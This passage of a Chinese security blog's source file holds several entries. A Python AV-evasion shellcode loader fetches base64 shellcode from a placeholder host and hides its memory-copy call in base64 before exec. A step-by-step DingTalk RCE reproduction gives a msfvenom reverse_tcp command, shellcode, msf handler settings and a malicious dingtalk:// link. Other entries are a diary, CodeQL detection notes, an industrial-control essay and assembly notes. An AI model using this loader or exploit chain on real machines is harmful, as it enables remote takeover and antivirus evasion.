<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#外部请求shellcode</span></span><br><span class="line">encode_shellcode = requests.get(<span class="string">&quot;http://yourip/123.txt&quot;</span>).text</span><br><span class="line"><span class="comment">#解密shellcode</span></span><br><span class="line">shellcode = base64.b64decode(encode_shellcode)</span><br><span class="line"></span><br><span class="line">rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line"><span class="comment">#此处为ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))原语句base64加密</span></span><br><span class="line">func=base64.b64decode(<span class="string">b&#x27;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSk=&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(func)</span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure>



<p>注意点：</p>
<p>1.python执行C语言shellcode时需要使用python3 32位，打包成exe文件也需要使用32位的，win10上打包生成的exe在win7环境下会报错，要选择相应版本打包。</p>
<p>2.msf生成shellcode时，有无base64加密生成的shellcode形式相似，类似”x2f\x4f\x69\x50\x41”</p>
<p>​	2.1.本文中默认生成的shellcode是C语言shellcode码，是把byte码用十六进制来表示</p>
<p>​	2.2.添加base64加密生成的是base64加密的shellcode，同样是把byte码用十六进制来表示。在调用时需要把十六进制转化为字符串，为了方便起见，免杀思路三中的放在服务器上的123.txt在十六进制转换的字符串，便于操作，否则需要本地再次转换。</p>
<p>附带科普下，内存运行编码的各种概念。</p>
<p>内存大小是使用byte为单位的，msf生成的byte码是执行在内存时的编码，为16进制，而python在打印时会自动将十六进制编码转换为字符串，下面的python代码打印的结果为AVlNXa。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = <span class="string">&quot;\x41\x56\x6c\x4e\x58\x61&quot;</span></span><br><span class="line"><span class="built_in">print</span>(test)</span><br></pre></td></tr></table></figure>

<p>0X1 &#x3D; 1byte<br>0X10 &#x3D; 16 byte<br>0X100 &#x3D; 16<em>16 byte &#x3D; 256 byte<br>0X1000 &#x3D; 16 <em>256 byte&#x3D; 4 * ( 4 * 256byte) &#x3D; 4 * 1024 byte &#x3D;4K byte<br>0X1 0000 &#x3D; 16 * 4K byte &#x3D; 64K byte<br>0X10 0000 &#x3D; 16 * 64K byte &#x3D; 1024K byte &#x3D; 1M byte<br>0X100 0000 &#x3D; 16 * 1M byte &#x3D; 16M byte<br>0X1000 0000 &#x3D; 16 * 16M byte &#x3D; 256M byte<br>0X1 0000 0000 &#x3D; 16 * 256Mbyte &#x3D; 4</em>(4</em>256) Mbyte &#x3D; 4*1024Mbyte&#x3D;4Gbyte</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Pop <span class="title function_">evPop</span><span class="params">(Pop pop, RuleBean rule)</span> &#123;</span><br><span class="line">	<span class="type">Pop</span> <span class="variable">new1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Pop</span>(pop.getLength());</span><br><span class="line">	<span class="type">int</span> elitismO;</span><br><span class="line">	<span class="keyword">if</span> (elitism) &#123;</span><br><span class="line">			elitismO = <span class="number">1</span>;</span><br><span class="line">			<span class="type">Paper</span> <span class="variable">fit</span> <span class="operator">=</span> pop.getFitness();</span><br><span class="line">			fit.setId(<span class="number">0</span>);</span><br><span class="line">			new1.setPaper(<span class="number">0</span>, fitness);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> elitismO; i &lt; new1.getLength(); i++) &#123;</span><br><span class="line">			<span class="type">Paper</span> <span class="variable">parent1</span> <span class="operator">=</span> select(pop);</span><br><span class="line">			<span class="type">Paper</span> <span class="variable">parent2</span> <span class="operator">=</span> select(pop);</span><br><span class="line">			<span class="keyword">while</span> (parent2.getId() == parent1.getId()) &#123;</span><br><span class="line">				parent2 = select(pop);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="type">Paper</span> <span class="variable">child</span> <span class="operator">=</span> crossover(parent1, parent2, rule);</span><br><span class="line">			child.setId(i);</span><br><span class="line">			newPopulation.setPaper(i, child);</span><br><span class="line">		&#125;</span><br><span class="line">    	Paper tmpPaper;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> elitismOffset; i &lt; newPopulation.getLength(); i++) &#123;</span><br><span class="line">			tmpPaper = new1.getPaper(i);</span><br><span class="line">			mutate(tmpPaper);</span><br><span class="line">			tmpPaper.setKpCoverage(rule);</span><br><span class="line">			tmpPaper.setAdaptationDegree(rule, Global.KP_WEIGHT, Global.DIFFCULTY_WEIGHt);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> new1;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>周日晚的碎碎念</title>
    <url>/2022/12/11/%E5%91%A8%E6%97%A5%E6%99%9A%E7%9A%84%E7%A2%8E%E7%A2%8E%E5%BF%B5/</url>
    <content><![CDATA[<p>这次的双休过得是最云里雾里的 ! </p>
<p>疫情开放了，想着多锻炼身体就约了前同事去爬山，主要是有两方面考量。</p>
<ol>
<li>长时间没运动，上班久坐，已经出现不适</li>
<li>周六下午一般都是玩，还不如去爬山，反正也学习不下</li>
</ol>
<p>重点是第二个原因，事与愿违。</p>
<p>以前的周六都是上午睡得满，下午基本也静不下心，都是玩游戏、看动漫之类的，到晚上才勉强做了点正事，然后周日可能就下午也会做点正事，这样双休就过去了。</p>
<p>所以这次是想，周六比起玩游戏啥的还不如去爬山运动。但结果导致，周日一整天都没心思干正事。我个人的玩乐是有点<strong>病态</strong>的。就疯狂玩游戏，大部分还是单机，一局个把小时，就一个人玩，或是看动漫，<strong>与其说停不下，应该是我不想停下来，只要不停下来，就不会想起原先的计划，以及那些许的罪恶感。</strong></p>
<p>这就造成了一种现象，玩游戏的时候，一局单机游戏两个小时，随便开，打不赢重新打；看动漫都是一部又一部，根本不想停下来，也不是游戏有多好玩或是动漫有多好看，就是不想停下来。时常出现眼睛酸痛或是头晕，都不怎么停下来。</p>
<p>造成这些情况主要是因为以前娱乐时养成的不良习惯，另一方面就是，<strong>报复性娱乐</strong>。跟报复性熬夜类似，平常工作，所以周六日一定是毫无忌惮地放松下；周六去爬山了，娱乐的时间被挤占了，那就一定要熬夜或是隔天补回来，虽然没有明确地正常想，但事实的行动已经表明就是这样，因此这周六的爬山造成的是完全相反的结果。</p>
<p>也许应该把工作和娱乐混在一起，没必要分得那么开，把工作日和休息日的节奏把控相似，因为目前工作并不痛苦，压力并不大，大多都是自怨自艾罢了。</p>
<p>关于朋友相聚也有些感想，现在周围的圈子并不适合我，应该认识一些新朋友，线上线下都可以，不想再参加没有实际意义的聚会和抱怨大会了。</p>
]]></content>
      <categories>
        <category>日常向</category>
      </categories>
      <tags>
        <tag>吐槽</tag>
      </tags>
  </entry>
  <entry>
    <title>Record</title>
    <url>/2023/07/10/Record/</url>
    <content><![CDATA[<p>2023-08-06</p>
<p>predicate 没有返回值，做限定</p>
<p>exists 根据内部的子查询返回true or false</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br></pre></td></tr></table></figure>

<p>这是<code>SDK</code>自带的规则，里面包含了大多常用的Source入口。我们使用的SpringBoot也包含在其中</p>
<hr>
<p>1、找一个新版的简单点，能跑的 dos 脚本，有的话最好，然后根据老版的dos思路改</p>
<p>2、直接把老版的思路改，显然有点不符合实用主义</p>
<p><a href="https://github.com/webraybtl/CodeQLpy">https://github.com/webraybtl/CodeQLpy</a></p>
<p>CWE-730 redos</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 表达式声明：</span><br><span class="line">* Expr expSrc，</span><br><span class="line">* </span><br><span class="line">* 方法声明:</span><br><span class="line">* Method method</span><br><span class="line">* Method：Method是一个表示Java程序中方法的类。它包含有关方法的信息，如方法名称、所在的类、</span><br><span class="line">* 参数类型、返回类型等。你可以使用Method来分析方法的定义、签名和其他属性。</span><br><span class="line">* </span><br><span class="line">* 方法的访问，所有方法的属性：</span><br><span class="line">* MethodAccess：MethodAccess是一个表示Java程序中对方法的访问的类。它包含有关方法访问的信息，</span><br><span class="line">* 如方法调用的位置、参数传递、调用者等。你可以使用MethodAccess来分析方法的调用、使用情况和调用者的上下文。</span><br><span class="line">* </span><br><span class="line">* 简而言之，Method用于表示方法的定义和属性，而MethodAccess用于表示方法的访问和调用。</span><br><span class="line">* </span><br><span class="line">* 在CodeQL查询中，你可以使用这两个类来进行不同类型的分析。例如，你可以使用Method来查找具有特定属性的方法，</span><br><span class="line">* 如静态方法、私有方法或抽象方法。而使用MethodAccess则可以查找调用了特定方法的代码行，或者分析方法的调用图。</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 该脚本用于测试DoS漏洞，检查传递的参数是否进行了适当的限制。</span><br><span class="line"> * 请将待测试的Java源代码与该脚本放在同一个CodeQL项目中进行分析。</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line">// Rule: 检查数据库查询的参数是否有限制一次性的查询数量</span><br><span class="line">predicate hasUnrestrictedQuery(db: Database, query: Expr) : bool &#123;</span><br><span class="line">  exists(MethodAccess methodAccess |</span><br><span class="line">    methodAccess.getMethod().getName() = &quot;executeQuery&quot; and</span><br><span class="line">    methodAccess.getArgument(0) = query and</span><br><span class="line">    methodAccess.getQualifier() = db</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Rule: 检查传递的pagesize参数是否进行了适当的限制</span><br><span class="line">predicate hasUnrestrictedPageSize(pageSize: Expr) : bool &#123;</span><br><span class="line">  exists(MethodAccess methodAccess |</span><br><span class="line">    methodAccess.getMethod().getName() = &quot;setPageSize&quot; and</span><br><span class="line">    methodAccess.getArgument(0) = pageSize</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Rule: 检查类中具体参数是否进行了适当的限制</span><br><span class="line">predicate hasUnrestrictedParameter(classType: Type, parameter: Parameter) : bool &#123;</span><br><span class="line">  exists(MethodAccess methodAccess |</span><br><span class="line">    methodAccess.getMethod().getDeclaringType() = classType and</span><br><span class="line">    methodAccess.getArgument(parameter.getIndex()) = parameter</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Rule: 检查List的长度是否进行了适当的限制</span><br><span class="line">predicate hasUnrestrictedListSize(list: Expr) : bool &#123;</span><br><span class="line">  exists(MethodAccess methodAccess |</span><br><span class="line">    methodAccess.getMethod().getName() = &quot;size&quot; and</span><br><span class="line">    methodAccess.getQualifier() = list</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Rule: 检查DoS漏洞</span><br><span class="line">from MethodAccess methodAccess, Method method, Parameter parameter, ClassType classType, Expr pageSize, Expr list</span><br><span class="line">where</span><br><span class="line">  methodAccess.getMethod() = method and</span><br><span class="line">  methodAccess.getArgument(parameter.getIndex()) = pageSize and</span><br><span class="line">  methodAccess.getMethod().getDeclaringType() = classType and</span><br><span class="line">  methodAccess.getQualifier() = classType and</span><br><span class="line">  hasUnrestrictedQuery(_, pageSize) or</span><br><span class="line">  hasUnrestrictedPageSize(pageSize) or</span><br><span class="line">  hasUnrestrictedParameter(classType, parameter) or</span><br><span class="line">  hasUnrestrictedListSize(list)</span><br><span class="line">select methodAccess, &quot;Potential DoS vulnerability: unrestricted parameter usage&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @name Arbitrary file write during archive extraction (&quot;Zip Slip&quot;)</span><br><span class="line"> * @description Extracting files from a malicious archive without validating that the</span><br><span class="line"> *              destination file path is within the destination directory can cause files outside</span><br><span class="line"> *              the destination directory to be overwritten.</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @id java/zipslip</span><br><span class="line"> * @problem.severity error</span><br><span class="line"> * @security-severity 7.5</span><br><span class="line"> * @precision high</span><br><span class="line"> * @tags security</span><br><span class="line"> *       external/cwe/cwe-022</span><br><span class="line"> * Zip Slip是一个广泛存在的关键存档提取（critical archive extraction）漏洞，</span><br><span class="line"> * 该漏洞允许攻击者在系统中任意写文件，尤其是会导致远程命令执行。</span><br><span class="line"> * </span><br><span class="line"> * zip解压，任意文件上传</span><br><span class="line"> * source应该是识别外面输入的压缩文件</span><br><span class="line"> * sink应该是解压操作</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.security.ZipSlipQuery</span><br><span class="line">import ZipSlipFlow::PathGraph</span><br><span class="line">//导入PathGraph命名空间，并将其视为ZipSlipFlow命名空间的子命名空间。</span><br><span class="line">//因此，PathGraph命名空间中定义的查询文件或模块可以在ZipSlipFlow命名空间中使用。</span><br><span class="line"></span><br><span class="line">// ZipSlipFlow 也是调用的 DataFlow::Node，识别sink为 archive entry</span><br><span class="line">// A sink that represents a file creation, such as a file write, copy or move operation.</span><br><span class="line">from ZipSlipFlow::PathNode source, ZipSlipFlow::PathNode sink</span><br><span class="line">where ZipSlipFlow::flowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink,</span><br><span class="line">  &quot;Unsanitized archive entry, which may contain &#x27;..&#x27;, is used in a $@.&quot;, sink.getNode(),</span><br><span class="line">  &quot;file system operation&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">    source: 获取到入参为类参数且其中包含 List&lt;&gt; / BatchVO&lt;&gt; 字段</span><br><span class="line"></span><br><span class="line">    sink:</span><br><span class="line">    1、(1.1)类中是否有长度限制注解，（1.2）是否有自定义写的size判断，foreach循环</span><br><span class="line">    2、(1)是否 List 字段赋值给其他变量，（2）新的 List 变量是否有做限制，foreach循环</span><br><span class="line"></span><br><span class="line">    0、获取所有参数为类，类名不包括&lt;，类成员包括 List&lt;&gt;</span><br><span class="line">    1、判断方法是否有类注解 @PaginationCheck</span><br><span class="line">    2、判断类参数涉及 List是否有 @Size 注解</span><br><span class="line">    3、判断类参数是否调用 size()方法做判断</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    处理措施：</span><br><span class="line">    1、类注解 @PaginationCheck</span><br><span class="line">    2、类成员变量注解 @Size</span><br><span class="line">    3、List&lt;&gt;可以在参数声明限制，参数声明注解 @Size</span><br><span class="line">    4、手段判断 if (xx.size() &gt; xx ) 限制</span><br><span class="line"></span><br><span class="line">    为什么参数名为 p0</span><br><span class="line">*/</span><br><span class="line">import java</span><br><span class="line"></span><br><span class="line">// 定义一个规则来判断参数是否为List类型</span><br><span class="line">// predicate isListParameter(Parameter p) &#123;</span><br><span class="line">//     p.getType().implementsInterface(&quot;java.util.List&quot;)</span><br><span class="line">// &#125;</span><br><span class="line"></span><br><span class="line">// from Class c, Parameter p</span><br><span class="line">// where p.getType().(Class) = c</span><br><span class="line">// // and not exists(c.getName().indexOf(&quot;&lt;&quot;))</span><br><span class="line">// and c.getName() = &quot;MultipartFile&quot;</span><br><span class="line">// // c.getAField().getType()</span><br><span class="line">// select c.getName(), c.getAField(), c.getAField().getType(), p.getName()</span><br><span class="line"></span><br><span class="line">// 判断方法中是否包含类参数</span><br><span class="line">// predicate isListParameter(MethodAccess m) &#123;</span><br><span class="line">//     exists(Class c | m.getParameter)</span><br><span class="line">// &#125;</span><br><span class="line"></span><br><span class="line">// 创建一个谓词来遍历方法的每个参数名和值</span><br><span class="line">// predicate traverseMethodArguments(MethodAccess methodAccess, string methodName, Expr[] arguments, string argumentName, Expr argumentValue) &#123;</span><br><span class="line">//     // 确定方法调用的名称和参数</span><br><span class="line">//     methodAccess.getMethod().getName() = methodName and</span><br><span class="line">//     methodAccess.getArguments() = arguments and</span><br><span class="line">//     // 使用谓词来遍历参数名和值</span><br><span class="line">//     methodAccess.getArgumentName(argumentName, argumentValue)</span><br><span class="line">//   &#125;</span><br><span class="line"></span><br><span class="line">predicate hasSize(Class c)&#123;</span><br><span class="line">    exists(Annotation a, Parameter p | p.getType().(Class) = c</span><br><span class="line">        and not exists(c.getName().indexOf(&quot;&lt;&quot;))</span><br><span class="line">        and exists(c.getAField().toString().indexOf(&quot;List&lt;&quot;))</span><br><span class="line">        and a.getAnnotatedElement() = c.getAField()</span><br><span class="line">        and a.toString() = &quot;Size&quot;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">根据你的最新信息，如果 implementsInterface 被弃用了，那么在最新版本的 CodeQL 中判断类型的方法可能会有所不同。在这种情况下，你可以使用 instanceOf 谓词来判断类型是否符合你的需求。以下是一个示例代码，演示了如何使用 instanceOf 谓词来判断类型是否为 List&lt;&gt;：</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line"></span><br><span class="line">// 查询入口：查找类型为 List&lt;&gt; 的成员</span><br><span class="line">from ClassMember member</span><br><span class="line">where</span><br><span class="line">  // 判断成员的类型是否为 List&lt;&gt;</span><br><span class="line">  member.getType() instanceof ClassType and</span><br><span class="line">  member.getType().asClassType().getQualifiedName() = &quot;java.util.List&quot;</span><br><span class="line">select member</span><br><span class="line">在上述查询代码中，我们使用 instanceof 谓词来检查成员的类型是否为 ClassType，然后使用 asClassType() 方法获取类类型，最后判断类类型的限定名称是否为 &quot;java.util.List&quot;。</span><br><span class="line"></span><br><span class="line">请根据你的具体需求修改查询条件和类名称，以适应你的情况。</span><br><span class="line"></span><br><span class="line">如果你还有其他问题或需要进一步帮助，请随时提问。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>菜鸟</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>征途上，新的开始</title>
    <url>/2022/08/29/%E5%BE%81%E9%80%94%E4%B8%8A%EF%BC%8C%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/</url>
    <content><![CDATA[<p>For me, it has not yet been realized what the rest of one’s life, is my greatest encouragement.</p>
<p>对我来说，一件尚未实现的事，就是我有生之年的最大鞭策。</p>
]]></content>
  </entry>
  <entry>
    <title>国内DCS系统发展现状</title>
    <url>/2022/09/03/%E5%9B%BD%E5%86%85DCS%E7%B3%BB%E7%BB%9F%E5%8F%91%E5%B1%95%E7%8E%B0%E7%8A%B6/</url>
    <content><![CDATA[<p>先简单给各位介绍下DCS系统。DCS系统大多用于工业控制领域，主要用于控制生产制造系统，所体现的是控制功能分散而管理功能集中，属于分布式控制系统。实现集中管理和生产控制器交互，完成生产任务。与信息系统不同的是，在工业控制生产环境，对信息传递的实时性要求非常高，信息的延误可能会导致生产事故，因此多采用局域网通信。DCS系统适用于石油石化、水资源处理（如:污水处理厂）以及工业发电（火电、核电等）。</p>
<p>在DCS系统的应用环境中是用的专用工控协议，很多人对工控协议有所误解，认为在工业控制中所用的专用协议，安全性肯定比常用协议好，其实不然。各种工控协议的设计之初，大多只考虑了生产环境要求的实时性，对安全性考虑得较少。比如我们在日常使用中加密算法，往往在工控协议中就不包含或是极少涉及，因为加密会影响实时性且占用局域网内的资源。工控网中的资源占用导致的后果是十分严重的，可能导致现场生产设备的失控。因此，在DCS系统中所做的安全防护可谓少之又少，近年国家对各种场站做了调查，发现国内百分之九十的DCS都没有做加固。对这些国外进口的设备丝毫不敢动，生怕厂商不给维护，过于依赖后台厂商。</p>
<p>国内工控系统受制于系统厂商。常常表现为，很多事情的落实过度依赖于后台厂家，包括维护、检修、升级、安装安防产品等。</p>
<p>比如说现在国内的DCS系统，几乎全都是国外厂商的、像是ABB、艾默生、福克斯波罗等，这也导致在DCS中做安全防护，像是主机加固等很难推进。因为厂家表示，做了国内的主机加固，出了问题他们厂家概不负责。他们也有所谓的“正当理由”，表示上的安防产品需要通过他们国外厂商的测评(实际上他们可能根本没有所谓的测评机构，往往只是不想让你用)。</p>
<p>但实际上国家对这一块的要求早就相当明确，就拿国网来说，早在2006年的国网1167号文件就有规定，什么样的安全产品才能进入生产控制大区，即必须通过国家委托测评的产品就能够部署在生产大区，而南网2015年通用技术规范也有相关的要求。更关键的一点是，2015年能源局36号文的出台，更是提出了生产控制大区主机操作系统应当进行安全加固，原先做加固只能根据用户的需要和自身的安全意识高低决定做不做，而现在已经是有国家明文规定了。15年之前的主机加固推进相对艰难，但即便在现在能源局36号文出台6年后，仍旧有不少厂站主机系统没有做加固。面对这种情况，国外厂商也变着法子满足要求，自身系统附带主机加固软件，当然他们仅仅是为了满足国内文件要求，变相让我们不做国内的加固。这种厂商自己也做加固的行为从两方面就可以驳倒：</p>
<ol>
<li>国家文件早有规定什么样的安全产品才能进入生产控制大区，而不是说厂家自身的产品就是合规达标的，也许厂家自身的加固产品不会导致系统宕机，但没有通过测评的产品都是不合规达标的，而国外产品基本上都是没有通过国内测评。</li>
<li>做主机加固的目的就是为了防止系统本身或外来攻击造成的核心业务非法中断、核心数据非法篡改的问题。主机加固也是为了防止厂家系统的一些漏洞问题，如果厂商自己做，那就相对于又是裁判员，又是参赛员，这就没有意义了，同时这一块也是为了防止国外的技术封锁，在系统中设下后门程序等。</li>
</ol>
<p>鉴于以上两点可以总结出，应该对生产控制大区主机操作系统进行安全加固，且所采用的产品应该通过国家指定机构的委托测评。在工控安全这一块不应过于受制于系统厂商。目前国家对工控安全日益重视，但现实是国内电厂、电网的安全意识仍旧低下。</p>
<p>其实，十几年前有一段时间，国内新华集团制造的DCS系统在国内市场占有率相当可观，DEH国内占有率更是高达80%。而后来出于对国际大公司的信任，大大低估了“国际游戏”的玩法。想利用通过和GE公司的合作打开国外市场，殊不知对方早已虎视眈眈，被并购的决定直接就是投怀送抱，导致了封锁了国产DCS系统的发展，并被巨额索赔，直接导致了到目前为止新华集团的DCS系统在国内已经鲜有人知了。</p>
<p>其实近些年国外企业打压手段已经逐渐浮出水面，恶意投资然后雪藏，或是投资傀儡公司以竞争名义进行打压等。19年的《美国陷阱》就已经揭露了GE如何在美国政府扶持下恶意收购法国的阿尔斯通，以现在的角度来看，这场“战争”早在几十年前就开始了，这场没有硝烟的战争终将会持续，并极大可能成为以后国际公司新的战场。最后借用《美国陷阱》中的一句话，阿尔斯通不是第一家被美国恶意收购的公司，也不会是最后一家。</p>
]]></content>
      <categories>
        <category>工控安全</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>钉钉RCE反弹shell</title>
    <url>/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<p><strong>0x01 影响版本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">钉钉版本&lt; 6.3.25-Release.2149108</span><br></pre></td></tr></table></figure>

<p><strong>0x02 复现过程</strong></p>
<p>1、环境说明：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机:192.168.31.198(Kali Linux)</span><br><span class="line">目标机:192.168.239.135(windows10)</span><br><span class="line">钉钉6.3.5版本下载地址：</span><br><span class="line">https://dtapp-pub.dingtalk.com/dingtalk-desktop/win_installer/Release/DingTalk_v6.3.5.11308701.exe</span><br></pre></td></tr></table></figure>

<p>注：此处有个问题，打开旧版钉钉会提示版本过老无法正常登录</p>
<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/old.png" class title="This is an example image">

<p>解决办法：<br>在另一台电脑安装最新版的钉钉，打开安装路径，复制staticconfig.xml文件替换到旧版即可，之后正常登录，记得把自动登录勾选上。然后在软件内设置不自动更新，退出后再把原先的配置文件覆盖回来即可解决乱码问题。其实不解决乱码问题也能触发payload。</p>
<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/path1.png" class title="This is an example image">

<p>2、msf生成shellcode:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.31</span><span class="number">.198</span> LPORT=<span class="number">8834</span> -f csharp</span><br></pre></td></tr></table></figure>

<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/shellcode.png" class title="This is an example image">

<p>3、替换payload里的shellcode</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">项目地址：https:<span class="comment">//github.com/crazy0x70/dingtalk-RCE</span></span><br><span class="line"></span><br><span class="line">替换项目中test.html中的shellcode，需要替换的位置为</span><br><span class="line">var shellcode=new Uint8Array([<span class="number">0xfc</span>,<span class="number">0xe8</span>,<span class="number">0x8f</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x60</span>,<span class="number">0x89</span>,<span class="number">0xe5</span>,<span class="number">0x31</span>,<span class="number">0xd2</span>,<span class="number">0x64</span>,<span class="number">0x8b</span>,<span class="number">0x52</span>,<span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x8b</span>,<span class="number">0x52</span>,<span class="number">0x0c</span>,<span class="number">0x8b</span>,<span class="number">0x52</span>,<span class="number">0x14</span>,<span class="number">0x0f</span>,<span class="number">0xb7</span>,<span class="number">0x4a</span>,<span class="number">0x26</span>,<span class="number">0x31</span>,<span class="number">0xff</span>,<span class="number">0x8b</span>,<span class="number">0x72</span>,<span class="number">0x28</span>...])</span><br></pre></td></tr></table></figure>

<p>4、msf监听反弹端口</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> LHOST <span class="number">192.168</span><span class="number">.31</span><span class="number">.198</span></span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">8834</span></span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/listen.png" class title="This is an example image">

<p>5、开启web服务，构造poc发送给目标机</p>
<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/web%E6%9C%8D%E5%8A%A1.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">poc:dingtalk://dingtalkclient/page/link?url=http://192.168.31.198:8080/dingding.html&amp;pc_slide=true</span><br></pre></td></tr></table></figure>

<p>6、payload触发</p>
<ul>
<li>如果按照上面的方式操作，软件不会乱码，直接发送在聊天框点击触发即可</li>
<li>乱码情况下直接在浏览器访问引导触发也可以</li>
</ul>
<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/dingtalk.png" class title="This is an example image">

<p>点击打开，kali就能反弹到shell</p>
<img src="/2022/09/15/%E9%92%89%E9%92%89RCE%E5%8F%8D%E5%BC%B9shell/shell.png" class title="This is an example image">

<p><strong>0x03 修复建议</strong></p>
<p>更新到最新版即可</p>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Notes-Decompile</title>
    <url>/2024/02/22/Notes-Decompile/</url>
    <content><![CDATA[<h1 id="DOS模拟器"><a href="#DOS模拟器" class="headerlink" title="DOS模拟器"></a>DOS模拟器</h1><h2 id="DOSbox"><a href="#DOSbox" class="headerlink" title="DOSbox"></a>DOSbox</h2><p>挂载主机文件夹</p>
<p>开机自动配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount c C:\Users\admin\Desktop\tool\debug</span><br><span class="line">mount d C:\Users\admin\Desktop\binary\16asm</span><br><span class="line">set path=c:</span><br><span class="line">d:</span><br></pre></td></tr></table></figure>

<h3 id="msdosplayer"><a href="#msdosplayer" class="headerlink" title="msdosplayer"></a>msdosplayer</h3><h3 id="VS插件-MASM-x2F-TASM"><a href="#VS插件-MASM-x2F-TASM" class="headerlink" title="VS插件-MASM&#x2F;TASM"></a>VS插件-MASM&#x2F;TASM</h3><h1 id="16ASM汇编"><a href="#16ASM汇编" class="headerlink" title="16ASM汇编"></a>16ASM汇编</h1><p>8086cpu组织结构——寄存器（cpu的“局部变量”）</p>
<img src="/2024/02/22/Notes-Decompile/00.png" class title="This is an example image">

<img src="/2024/02/22/Notes-Decompile/00-1.png" class title="This is an example image">



<p>•EU部件：执行部件（excution unit）、译码、执行指令</p>
<p>•BIU部件：总线接口部件（bus interface unit）、取指令、读取数据、写入数据</p>
